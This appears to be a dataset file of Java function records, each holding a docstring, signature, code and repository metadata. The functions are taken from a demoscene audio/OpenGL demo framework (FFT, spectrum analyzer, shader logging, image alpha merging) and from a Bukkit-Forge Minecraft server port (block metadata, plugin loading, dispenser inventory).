{"docstring": "//writes part of specified buffer to the monitored source data line an any registered DSPs.\n", "func_signal": "public void writeAudioData(byte[] pAudioData, int pOffset, int pLength)", "code": "{\n    if (sourceDataLineWrite) {\n        writeChunkedAudioData(pAudioData, pOffset, pLength);\n    } else {\n        storeAudioData(pAudioData, pOffset, pLength);\n    }\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_DigitalSignalSynchronizer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//allocate space for up to 3 VBO identifiers\n", "func_signal": "public WavefrontObjectLoader_VertexBufferObject(String inModelPath)", "code": "{\n        BaseLogging.getInstance().info(\"LOADING WAVEFRONT OBJECT MODEL AS VERTEX BUFFER OBJECT \"+inModelPath);\n        OBJModelPath = inModelPath;\n        LoadOBJModel(OBJModelPath);\n        SetFaceRenderType();\n        BaseLogging.getInstance().info(\"POLYGON COUNT FOR MODEL=\"+PolyCount);\n        BaseLogging.getInstance().info(\"VERTEX COUNT FOR MODEL=\"+vData.size());\n        BaseLogging.getInstance().info(\"TEXTURE COORDINATE COUNT FOR MODEL=\"+vtData.size());\n        BaseLogging.getInstance().info(\"NORMAL COUNT FOR MODEL=\"+vnData.size());\n    }", "path": "code_demos_jogamp\\src\\framework\\util\\WavefrontObjectLoader_VertexBufferObject.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//Sets the FFT sample size and rate to be just for calculating the spectrum\n//analyser values.\n", "func_signal": "private synchronized void setSpectrumAnalyserSampleSizeAndRate(int pSize,float pRate)", "code": "{\n    saFFTSampleSize = pSize;\n    saFFTSampleRate = pRate;\n    mBaseMusic_FastFourierTransform = new BaseMusic_FastFourierTransform(saFFTSampleSize);\n    mCurrentFFTData = new float[mSpectrumAnalyzer_BandCount];\n    computeBandTables();\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_ScopeAndSpectrumAnalyzer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "/*\n// Draws a volume meter bar on this component at the specified coordinates.\nprivate void drawVolumeMeterBar(Graphics pGraphics, int pX, int pY, int pWidth, int pHeight) {\n    float c = 0;\n    for (int a = pX; a <= pX + pWidth; a += 2) {\n        c += vuColorScale;\n        if (c < 256.0f) {\n            pGraphics.setColor(colorScaleTable[(int) c]);\n        }\n        pGraphics.fillRect(a, pY, 1, pHeight);\n    }\n}\n*/\n", "func_signal": "private BufferedImage getRenderBuffer()", "code": "{\n    if (mBufferedImage_RenderBuffer == null) {\n        updateSpectrumAnalyserBandWidth();\n        computeColorScale();\n        mBufferedImage_RenderBuffer = TextureUtils.createARGBBufferedImage(DEFAULT_WIDTH, DEFAULT_HEIGHT);\n    }\n    return mBufferedImage_RenderBuffer;\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_ScopeAndSpectrumAnalyzer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "// entry point for synchronizer ...\n", "func_signal": "public void process(BaseMusic_DigitalSignalSynchronizer.Context pDssContext)", "code": "{\n    float[][] wChannels = pDssContext.getDataNormalized();\n    Image wDb = getRenderBuffer();\n    Graphics wGrp = wDb.getGraphics();\n    wGrp.setColor(Color.BLACK);\n    wGrp.fillRect(0, 0, DEFAULT_WIDTH, DEFAULT_HEIGHT);\n    //drawVolumeMeter( wGrp, wChannels, pDssContext.getFrameRatioHint() );\n    drawScope(wGrp, wChannels, pDssContext.getFrameRatioHint());\n    drawSpectrumAnalyser(wGrp, wChannels, pDssContext.getFrameRatioHint());\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_ScopeAndSpectrumAnalyzer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//Draws a spectrum analyzer across the entire width and height if this component.\n", "func_signal": "protected void drawSpectrumAnalyser(Graphics inGraphics, float[] pSample,float pFrrh)", "code": "{\n    float c = 16;\n    float wSadfrr = (saDecay * pFrrh);\n    int b, bd, i, li = 0, mi;\n    float fs, m;\n    int wBm = 1;\n    //preparation used for rendering band frequencies.\n    if (saShowFrequencies) {\n        inGraphics.setFont(SMALL_FONT);\n        wBm = Math.round(32.0f / saBandWidth);\n        if (wBm == 0) {\n            wBm = 1;\n        }\n    }\n    //FFT processing ...\n    float[] wFFT = mBaseMusic_FastFourierTransform.calculate(pSample);\n    //group up available bands using band distribution table.\n    for (bd = 0; bd < mSpectrumAnalyzer_BandCount; bd++) {\n        //get band distribution entry.\n        i = mSpectrumAnalyser_BandDistributionTable[bd].distribution;\n        m = 0;\n        mi = 0;\n        //find loudest band in group. (Group is from 'li' to 'i')\n        for (b = li; b < i; b++) {\n            float lf = wFFT[b];\n            if (lf > m) {\n                m = lf;\n                mi = b;\n            }\n        }\n        li = i;\n        //calculate gain using log, then static gain.\n        fs = (m * sabgTable[mi]) * saGain;\n        //limit over-saturation.\n        if (fs > 1.0f) {\n            fs = 1.0f;\n        }\n        //compute decay.\n        if (fs >= (mCurrentFFTData[bd] - wSadfrr)) {\n            mCurrentFFTData[bd] = fs;\n        } else {\n            mCurrentFFTData[bd] -= wSadfrr;\n            if (mCurrentFFTData[bd] < 0) {\n                mCurrentFFTData[bd] = 0;\n            }\n            fs = mCurrentFFTData[bd];\n        }\n        //draw band\n        drawSpectrumAnalyserBand(inGraphics, Math.round(c),\n                DEFAULT_HEIGHT - 16, Math.round(c + saBandWidth) - Math.round(c) - 1,\n                (int) (fs * (DEFAULT_HEIGHT - 32)),\n                mSpectrumAnalyser_BandDistributionTable[bd],\n                saShowFrequencies && (bd % wBm) == 0);\n        c += saBandWidth;\n    }\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_ScopeAndSpectrumAnalyzer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "/**\n * Pre-calculates SIN/COS and bitrev tables in memory.\n */\n", "func_signal": "private void prepareTables()", "code": "{\n    int n2 = ss2;\n    int nu1 = nu - 1;\n    float p, arg;\n    int   k = 0, x = 0;\n    //prepare SIN/COS tables\n    for ( int l = 0; l < nu; l++ ) {\n        k = 0;\n        while ( k < ss ) {\n            for ( int i = 0; i < n2; i++ ) {\n                p = bitrev( k >> nu1, nu );\n                arg = 2 * (float)Math.PI * p / ss;\n                fftSin[ x ] = (float)Math.sin( arg );\n                fftCos[ x ] = (float)Math.cos( arg );\n                k++;\n                x++;\n            }\n            k += n2;\n        }\n        nu1--;\n        n2 >>= 1;\n    }\n    //prepare bitrev table\n    fftBr = new int[ ss ];\n    for( k = 0; k < ss; k++ ) {\n        fftBr[ k ] = bitrev( k, nu );\n    }\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_FastFourierTransform.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//writes part of specified buffer to the monitored source data line an any registered DSPs.\n", "func_signal": "protected void writeChunkedAudioData( byte[] pAudioData, int pOffset, int pLength )", "code": "{\n    if (mAudioDataBuffer == null) {\n        return;\n    }\n    int wWl;\n    for (int o = pOffset; o < pOffset + pLength; o += DEFAULT_WRITE_CHUNK_SIZE) {\n        wWl = DEFAULT_WRITE_CHUNK_SIZE;\n        if (o + wWl >= pLength) {\n            wWl = pLength - o;\n        }\n        mSourceDataLine.write(pAudioData, o, wWl);\n        storeAudioData(pAudioData, o, wWl);\n    }\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_DigitalSignalSynchronizer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "/*\npublic static BufferedImage getCombinedRGBAndAlphaGenerateImage(String inRGBFileName) {\n    try {\n        System.out.println(\"LOADING RGB CHANNEL IMAGE ... \"+inRGBFileName);\n        BufferedImage tRGBImage = AlphaChannelMerger.loadARGBImage(inRGBFileName,new BufferedInputStream(new FileInputStream(inRGBFileName)));\n        int[] tRGBA_RGB = AlphaChannelMerger.getARGBDataBufferFromBufferedImage(tRGBImage);\n        System.out.println(\"GENERATING ALPHA FROM GREYSCALE AND MERGING IMAGES AS RGBA...\");\n        BufferedImage tComposedImage = new BufferedImage(tRGBImage.getWidth(),tRGBImage.getHeight(), BufferedImage.TYPE_INT_ARGB);\n        int[] tRGBA_RGBA = ((DataBufferInt)tComposedImage.getRaster().getDataBuffer()).getData();\n        for (int y = 0; y < tRGBImage.getHeight(); y++) {\n            for (int x = 0; x < tRGBImage.getWidth(); x++) {\n                int r = tRGBA_RGB[(y * tRGBImage.getWidth()) + x] & 0x00FF0000;\n                int g = tRGBA_RGB[(y * tRGBImage.getWidth()) + x] & 0x0000FF00;\n                int b = tRGBA_RGB[(y * tRGBImage.getWidth()) + x] & 0x000000FF;\n                int ra = (tRGBA_RGB[(y * tRGBImage.getWidth()) + x] & 0x00FF0000) >> 16;\n                int ga = (tRGBA_RGB[(y * tRGBImage.getWidth()) + x] & 0x0000FF00) >> 8;\n                int ba = (tRGBA_RGB[(y * tRGBImage.getWidth()) + x] & 0x000000FF);\n                int generated_alpha = (int)((float)ra*0.299f+(float)ga*0.587f+ba*0.114f);\n                //System.out.println(\"R=\"+ra+\" G=\"+ga+\" B=\"+ba+\" A=\"+generated_alpha);\n                int a = generated_alpha<<24 & 0xFF000000;\n                tRGBA_RGBA[(y * tRGBImage.getWidth()) + x] = a+r+g+b;\n            }\n        }\n        System.out.println(\"MERGING SUCCESSFULLY FINISHED ...\");\n        return tComposedImage;\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n    return null;\n}\n*/\n", "func_signal": "public static void main(String[] args)", "code": "{\n    System.out.println(\"INITIALIZING ALPHACHANNEL MERGER ...\");\n    if (args.length==2) {\n        System.out.println(\"RGB+ALPHA PROVIDED ...\");\n        BufferedImage tCombinedImage = AlphaChannelMerger.getCombinedRGBAndAlphaImage(args[0],args[1]);\n        AlphaChannelMerger.saveARGBImage(args[0]+\"_ARGB.png\",tCombinedImage);\n    } else if (args.length==1) {\n        BufferedImage tGreyscaleImage = AlphaChannelMerger.generateGreyscaleImageFromRGB(args[0]);\n        AlphaChannelMerger.saveARGBImage(args[0]+\"_GREY.png\",tGreyscaleImage);\n        System.out.println(\"ONLY RGB PROVIDED ... GENERATING ALPHA FROM GREY IMAGE ...\");\n        BufferedImage tCombinedImage = AlphaChannelMerger.getCombinedRGBAndAlphaImage(args[0],args[0]+\"_GREY.png\");\n        AlphaChannelMerger.saveARGBImage(args[0]+\"_ARGB.png\",tCombinedImage);\n    } else {\n        System.out.println(\"INVALID NUMBER OF ARGUMENTS ...\");\n    }\n    System.out.println(\"ALPHA MERGER FINISHED ...\");\n}", "path": "code_demos_jogamp\\src\\framework\\tool\\AlphaChannelMerger.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//start monitoring the specified SourceDataLine ...\n", "func_signal": "public void start(SourceDataLine inSourceDataLine)", "code": "{\n    if (mSynchronizer == null) {\n        mSourceDataLine = inSourceDataLine;\n        mSampleSize = (int) (Math.round(mSourceDataLine.getFormat().getFrameRate()/(float)mFramesPerSecond));\n        mContext = new Context(mSampleSize);\n        mAudioDataBuffer = new byte[inSourceDataLine.getBufferSize()+DEFAULT_OVERRUN_PROTECTION];\n        mPosition = 0;\n        mNormalizer = null;\n        for (BaseMusic_DigitalSignalProcessorInterface wDsp : mRegistered_DigitalSignalProcessors) {\n            wDsp.initialize(mSampleSize, inSourceDataLine);\n        }\n        mSynchronizer = new Synchronizer(mFramesPerSecond,mFrameRateRatioHintCalibration);\t\t\n    }\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_DigitalSignalSynchronizer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "/**\n * Calculates a table of frequencies represented by the amplitude data returned by the 'calculate' method. \n * Each element states the end of the frequency range of the corresponding FFT band (or bin). For example:\n * \n * Range of band 0 =                 0.0 hz to frequencyTable[ 0 ] hz\n * Range of band 1 = frequencyTable[ 0 ] hz to frequencyTable[ 1 ] hz\n * Range of band 2 = frequencyTable[ 1 ] hz to frequencyTable[ 2 ] hz\n *   ... and so on.\n * \n * Calculation uses the sample size rounded to the nearest power of 2 of the FFT instance and the sample rate parameter\n * to build this table.\n * \n * @param  pSampleRate The sample rate used to calculate the frequency table. Usually the sample rate of the input\n *                     to the FFT calculate method.\n * @return             An array of frequency limits for each band. \n */\n", "func_signal": "public float[] calculateFrequencyTable( float pSampleRate )", "code": "{\n    float wFr = pSampleRate / 2.0f;\n    //calculate band width. \n    float wBw = wFr / ss2;\n    //store for frequency table\n    float[] wFt = new float[ (int)ss2 ];\n    //build band range table.\n    int b = 0;\n    for( float wFp = ( wBw / 2.0f ); wFp <= wFr; wFp += wBw ) {\n        wFt[ b ] = wFp;\n        b++;\n    }\n    return wFt;\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_FastFourierTransform.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "/**\n * @param pSampleSize The amount of the sample provided to the \"calculate\" method to use during\n *                    FFT calculations, this is used to prepare the calculation tables in advance.\n *                    This value is automatically rounded up to the nearest power of 2.\n */\n", "func_signal": "public BaseMusic_FastFourierTransform(int pSampleSize)", "code": "{\n    nu = (int)Math.ceil( Math.log( pSampleSize ) / Math.log( 2 ) );\n    //calculate the nearest sample size to a power of 2\n    ss = (int)Math.pow( 2, nu );\n    ss2 = ss >> 1; \n    //allocate calculation buffers\n    xre = new float[ ss ];\n    xim = new float[ ss ];\n    mag = new float[ ss2 ];\n    //allocate FFT SIN/COS tables\n    fftSin = new float[ nu * ss2 ];\n    fftCos = new float[ nu * ss2 ];\n    prepareTables();\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_FastFourierTransform.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//Draws a single spectrum analyzer band on this component and the specified coordinates.\n", "func_signal": "private void drawSpectrumAnalyserBand(Graphics pGraphics, int pX, int pY, int pWidth, int pHeight, Band pBandInfo, boolean pRenderFrequency)", "code": "{\n    float c = 0;\n    for (int a = pY; a >= pY - pHeight; a -= 2) {\n        c += saColorScale;\n        if (c < 256.0f) {\n            pGraphics.setColor(colorScaleTable[(int) c]);\n        }\n        pGraphics.fillRect(pX, a, pWidth, 1);\n    }\n    if (pRenderFrequency) {\n        pGraphics.setColor(Color.GREEN);\n        int wSx = pX + ((pWidth - pGraphics.getFontMetrics().stringWidth(pBandInfo.description)) >> 1);\n        pGraphics.drawLine(pX + (pWidth >> 1),pY + 2,pX + (pWidth >> 1),pY + (pGraphics.getFontMetrics().getHeight() - pGraphics.getFontMetrics().getAscent()));\n        pGraphics.drawString(pBandInfo.description, wSx, pY + pGraphics.getFontMetrics().getHeight());\n    }\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_ScopeAndSpectrumAnalyzer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "// Creates a color array containing the default color spread of the spectrum analyzer and vu meter.\n", "func_signal": "private Color[] getDefaultColorScale()", "code": "{\n    Color[] wColors = new Color[256];\n    for (int a = 0; a < 128; a++) {\n        wColors[a] = new Color(0, (a >> 1) + 192, 0);\n    }\n    for (int a = 0; a < 64; a++) {\n        wColors[a + 128] = new Color(a << 2, 255, 0);\n    }\n    for (int a = 0; a < 64; a++) {\n        wColors[a + 192] = new Color(255, 255 - (a << 2), 0);\n    }\n    return wColors;\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_ScopeAndSpectrumAnalyzer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//sets the numbers of bands rendered by the spectrum analyser.\n", "func_signal": "public void setSpectrumAnalyserBandCount(int pCount)", "code": "{\n    mSpectrumAnalyzer_BandCount = pCount;\n    computeBandTables();\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_ScopeAndSpectrumAnalyzer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "/**\n * Converts sound data over time into pressure values. (FFT)\n * \n * @param  pSample The sample to compute FFT values on.\n * @return         The results of the calculation, normalized between 0.0 and 1.0. \n */\n", "func_signal": "public float[] calculate( float[] pSample )", "code": "{\n    int n2 = ss2;\n    //fill buffer\n    for ( int a = 0; a < pSample.length; a++ ) {\n        xre[ a ] = pSample[ a ];\n        xim[ a ] = 0.0f;\n    }\n    //clear the remainder of the buffer\n    for ( int a = pSample.length; a < ss; a++ ) {\n        xre[ a ] = 0.0f;\n        xim[ a ] = 0.0f;\n    }\n    float tr, ti, c, s;\n    int   k, kn2, x = 0;\n    for ( int l = 0; l < nu; l++ ) {\n        k = 0;\n        while ( k < ss ) {\n            for ( int i = 0; i < n2; i++ ) {\n                //tabled sin/cos\n                c = fftCos[ x ]; \n                s = fftSin[ x ]; \n                kn2 = k + n2;\n                tr = xre[ kn2 ] * c + xim[ kn2 ] * s;\n                ti = xim[ kn2 ] * c - xre[ kn2 ] * s;\n                xre[ kn2 ] = xre[ k ] - tr;\n                xim[ kn2 ] = xim[ k ] - ti;\n                xre[ k ] += tr;\n                xim[ k ] += ti;\n                k++; \n                x++;\n            }\n            k += n2;\n        }\n        n2 >>= 1; \n    }\n    int r;\n    //reorder output\n    for( k = 0; k < ss; k++ ) {\n        //use tabled BR values\n        r = fftBr[ k ]; \n        if ( r > k ) {\n            tr = xre[ k ];\n            xre[ k ] = xre[ r ];\n            xre[ r ] = tr;\n            ti = xim[ k ];\n            xim[ k ] = xim[ r ];\n            xim[ r ] = ti;\n        }\n    }\n    //calculate magnitude\n    for ( int i = 0; i < ss2; i++ ) {\n        mag[ i ] = Math.abs( ( (float)( Math.sqrt( ( xre[ i ] * xre[ i ] ) + ( xim[ i ] * xim[ i ] ) ) ) / ss ) );\n    }\n    return mag;\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_FastFourierTransform.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//I like it the oldskool way ... :)\n", "func_signal": "private void checkShaderLogInfo(GL2 inGL, int inShaderObjectID)", "code": "{\n    IntBuffer tReturnValue = Buffers.newDirectIntBuffer(1);\n    inGL.glGetObjectParameterivARB(inShaderObjectID, GL_OBJECT_INFO_LOG_LENGTH_ARB, tReturnValue);\n    int tLogLength = tReturnValue.get();\n    if (tLogLength <= 1) {\n        return;\n    }\n    ByteBuffer tShaderLog = Buffers.newDirectByteBuffer(tLogLength);\n    tReturnValue.flip();\n    inGL.glGetInfoLogARB(inShaderObjectID, tLogLength, tReturnValue, tShaderLog);\n    byte[] tShaderLogBytes = new byte[tLogLength];\n    tShaderLog.get(tShaderLogBytes);\n    String tShaderValidationLog = new String(tShaderLogBytes);\n    StringReader tStringReader = new StringReader(tShaderValidationLog);\n    LineNumberReader tLineNumberReader = new LineNumberReader(tStringReader);\n    String tCurrentLine;\n    try {\n        while ((tCurrentLine = tLineNumberReader.readLine()) != null) {\n            if (tCurrentLine.trim().length()>0) {\n                System.out.println(\"GLSL VALIDATION: \"+tCurrentLine.trim());\n            }\n        }\n    } catch (Exception e) {\n        System.err.println(e);\n    }\n}", "path": "code_demos_elektronenmultiplizierer\\src\\GL3_Elektronenmultiplizierer_Port.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//Computes and stores a band distribution and gain tables for the spectrum analyzer. This is \n//performed using the current band distribution and gain instances. \n//See setSpectrumAnalyzerBandDistribution() or setSpectrumAnalyserBandGain() methods.\n", "func_signal": "private void computeBandTables()", "code": "{\t\n    if (mSpectrumAnalyzer_BandCount > 0 && saFFTSampleSize > 0 & mBaseMusic_FastFourierTransform != null) {\n        //create band table.\n        mSpectrumAnalyser_BandDistributionTable = mSpectrumAnalizer_BandDistribution.create( mSpectrumAnalyzer_BandCount, mBaseMusic_FastFourierTransform, saFFTSampleRate );\n        mSpectrumAnalyzer_BandCount   = mSpectrumAnalyser_BandDistributionTable.length;\n        updateSpectrumAnalyserBandWidth();\n        //resolve band descriptions.\n        resolveBandDescriptions(mSpectrumAnalyser_BandDistributionTable);\t\n        //create gain table.\n        sabgTable = saBandGain.create( mBaseMusic_FastFourierTransform, saFFTSampleRate );\n    }\n}", "path": "code_demos_jogamp\\src\\framework\\base\\BaseMusic_ScopeAndSpectrumAnalyzer.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "//I like it the oldskool way ... :)\n", "func_signal": "public static void checkShaderLogInfo(GL2 inGL, int inShaderObjectID)", "code": "{\n    IntBuffer tReturnValue = Buffers.newDirectIntBuffer(1);\n    inGL.glGetObjectParameterivARB(inShaderObjectID, GL_OBJECT_INFO_LOG_LENGTH_ARB, tReturnValue);\n    int tLogLength = tReturnValue.get();\n    if (tLogLength <= 1) {\n        return;\n    }\n    ByteBuffer tShaderLog = Buffers.newDirectByteBuffer(tLogLength);\n    tReturnValue.flip();\n    inGL.glGetInfoLogARB(inShaderObjectID, tLogLength, tReturnValue, tShaderLog);\n    byte[] tShaderLogBytes = new byte[tLogLength];\n    tShaderLog.get(tShaderLogBytes);\n    String tShaderValidationLog = new String(tShaderLogBytes);\n    StringReader tStringReader = new StringReader(tShaderValidationLog);\n    LineNumberReader tLineNumberReader = new LineNumberReader(tStringReader);\n    String tCurrentLine;\n    try {\n        while ((tCurrentLine = tLineNumberReader.readLine()) != null) {\n            if (tCurrentLine.trim().length()>0) {\n                BaseLogging.getInstance().info(\"GLSL VALIDATION: \"+tCurrentLine.trim());\n            }\n        }\n    } catch (Exception e) {\n        BaseLogging.getInstance().fatalerror(e);\n    }\n}", "path": "code_demos_jogamp\\src\\framework\\util\\ShaderUtils.java", "repo_name": "demoscenepassivist/SocialCoding", "stars": 64, "license": "None", "language": "java", "size": 206837}
{"docstring": "/**\n * Removes metadata from from a {@link Block} belonging to a given {@link Plugin}, ensuring the block being deleted from belongs\n * to this BlockMetadataStore's owning world.\n * @see MetadataStoreBase#removeMetadata(Object, String, org.bukkit.plugin.Plugin)\n */\n", "func_signal": "@Override\npublic void removeMetadata(Block block, String metadataKey, Plugin owningPlugin)", "code": "{\n    if(block.getWorld() == owningWorld) {\n        super.removeMetadata(block, metadataKey, owningPlugin);\n    } else {\n        throw new IllegalArgumentException(\"Block does not belong to world \" + owningWorld.getName());\n    }\n}", "path": "src\\org\\bukkit\\craftbukkit\\v1_5_R3\\metadata\\BlockMetadataStore.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Creates a new PluginDescriptionFile with the given detailed\n *\n * @param pluginName Name of this plugin\n * @param pluginVersion Version of this plugin\n * @param mainClass Full location of the main class of this plugin\n */\n", "func_signal": "public PluginDescriptionFile(final String pluginName, final String pluginVersion, final String mainClass)", "code": "{\n    name = pluginName;\n    version = pluginVersion;\n    main = mainClass;\n}", "path": "src\\org\\bukkit\\plugin\\PluginDescriptionFile.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Add item stack in first available inventory slot\n */\n", "func_signal": "public int addItem(ItemStack par1ItemStack)", "code": "{\n    for (int i = 0; i < this.dispenserContents.length; ++i)\n    {\n        if (this.dispenserContents[i] == null || this.dispenserContents[i].itemID == 0)\n        {\n            this.setInventorySlotContents(i, par1ItemStack);\n            return i;\n        }\n    }\n\n    return -1;\n}", "path": "src\\net\\minecraft\\tileentity\\TileEntityDispenser.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Tests to see if a metadata value has been added to a {@link Block}, ensuring the block being interrogated belongs\n * to this BlockMetadataStore's owning world.\n * @see MetadataStoreBase#hasMetadata(Object, String)\n */\n", "func_signal": "@Override\npublic boolean hasMetadata(Block block, String metadataKey)", "code": "{\n    if(block.getWorld() == owningWorld) {\n        return super.hasMetadata(block, metadataKey);\n    } else {\n        throw new IllegalArgumentException(\"Block does not belong to world \" + owningWorld.getName());\n    }\n}", "path": "src\\org\\bukkit\\craftbukkit\\v1_5_R3\\metadata\\BlockMetadataStore.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Get the inheritance map for remapping all plugins\n */\n", "func_signal": "public InheritanceMap getGlobalInheritanceMap()", "code": "{\n    if (globalInheritanceMap == null) {\n        Map<String, String> relocationsCurrent = new HashMap<String, String>();\n        relocationsCurrent.put(\"net.minecraft.server\", \"net.minecraft.server.\"+PluginClassLoader.getNativeVersion());\n        JarMapping currentMappings = new JarMapping();\n\n        try {\n            currentMappings.loadMappings(\n                    new BufferedReader(new InputStreamReader(this.getClass().getClassLoader().getResourceAsStream(\"mappings/\"+PluginClassLoader.getNativeVersion()+\"/cb2numpkg.srg\"))),\n                    new MavenShade(relocationsCurrent),\n                    null, false);\n        } catch (IOException ex) {\n            ex.printStackTrace();\n            throw new RuntimeException(ex);\n        }\n\n        BiMap<String, String> inverseClassMap = HashBiMap.create(currentMappings.classes).inverse();\n        globalInheritanceMap = new InheritanceMap();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(this.getClass().getClassLoader().getResourceAsStream(\"mappings/\"+PluginClassLoader.getNativeVersion()+\"/nms.inheritmap\")));\n\n        try {\n            globalInheritanceMap.load(reader, inverseClassMap);\n        } catch (IOException ex) {\n            ex.printStackTrace();\n            throw new RuntimeException(ex);\n        }\n        System.out.println(\"Loaded inheritance map of \"+globalInheritanceMap.size()+\" classes\");\n    }\n\n    return globalInheritanceMap;\n}", "path": "src\\org\\bukkit\\plugin\\java\\JavaPluginLoader.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Reads a tile entity from NBT.\n */\n", "func_signal": "public void readFromNBT(NBTTagCompound par1NBTTagCompound)", "code": "{\n    super.readFromNBT(par1NBTTagCompound);\n    NBTTagList nbttaglist = par1NBTTagCompound.getTagList(\"Items\");\n    this.dispenserContents = new ItemStack[this.getSizeInventory()];\n\n    for (int i = 0; i < nbttaglist.tagCount(); ++i)\n    {\n        NBTTagCompound nbttagcompound1 = (NBTTagCompound)nbttaglist.tagAt(i);\n        int j = nbttagcompound1.getByte(\"Slot\") & 255;\n\n        if (j >= 0 && j < this.dispenserContents.length)\n        {\n            this.dispenserContents[j] = ItemStack.loadItemStackFromNBT(nbttagcompound1);\n        }\n    }\n\n    if (par1NBTTagCompound.hasKey(\"CustomName\"))\n    {\n        this.customName = par1NBTTagCompound.getString(\"CustomName\");\n    }\n}", "path": "src\\net\\minecraft\\tileentity\\TileEntityDispenser.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Gets the DyeColor with the given wool data value.\n *\n * @param data Wool data value to fetch\n * @return The {@link DyeColor} representing the given value, or null if it doesn't exist\n * @see #getByDyeData(byte)\n */\n", "func_signal": "public static DyeColor getByWoolData(final byte data)", "code": "{\n    int i = 0xff & data;\n    if (i > BY_WOOL_DATA.length) {\n        return null;\n    }\n    return BY_WOOL_DATA[i];\n}", "path": "src\\org\\bukkit\\DyeColor.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Sets or overwrites a metadata value on a {@link Block} from a given {@link Plugin}, ensuring the target block belongs\n * to this BlockMetadataStore's owning world.\n * @see MetadataStoreBase#setMetadata(Object, String, org.bukkit.metadata.MetadataValue)\n */\n", "func_signal": "@Override\npublic void setMetadata(Block block, String metadataKey, MetadataValue newMetadataValue)", "code": "{\n    if(block.getWorld() == owningWorld) {\n        super.setMetadata(block, metadataKey, newMetadataValue);\n    } else {\n        throw new IllegalArgumentException(\"Block does not belong to world \" + owningWorld.getName());\n    }\n}", "path": "src\\org\\bukkit\\craftbukkit\\v1_5_R3\\metadata\\BlockMetadataStore.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
{"docstring": "/**\n * Removes from an inventory slot (first arg) up to a specified number (second arg) of items and returns them in a\n * new stack.\n */\n", "func_signal": "public ItemStack decrStackSize(int par1, int par2)", "code": "{\n    if (this.dispenserContents[par1] != null)\n    {\n        ItemStack itemstack;\n\n        if (this.dispenserContents[par1].stackSize <= par2)\n        {\n            itemstack = this.dispenserContents[par1];\n            this.dispenserContents[par1] = null;\n            this.onInventoryChanged();\n            return itemstack;\n        }\n        else\n        {\n            itemstack = this.dispenserContents[par1].splitStack(par2);\n\n            if (this.dispenserContents[par1].stackSize == 0)\n            {\n                this.dispenserContents[par1] = null;\n            }\n\n            this.onInventoryChanged();\n            return itemstack;\n        }\n    }\n    else\n    {\n        return null;\n    }\n}", "path": "src\\net\\minecraft\\tileentity\\TileEntityDispenser.java", "repo_name": "keepcalm/BukkitForge", "stars": 104, "license": "None", "language": "java", "size": 46905}
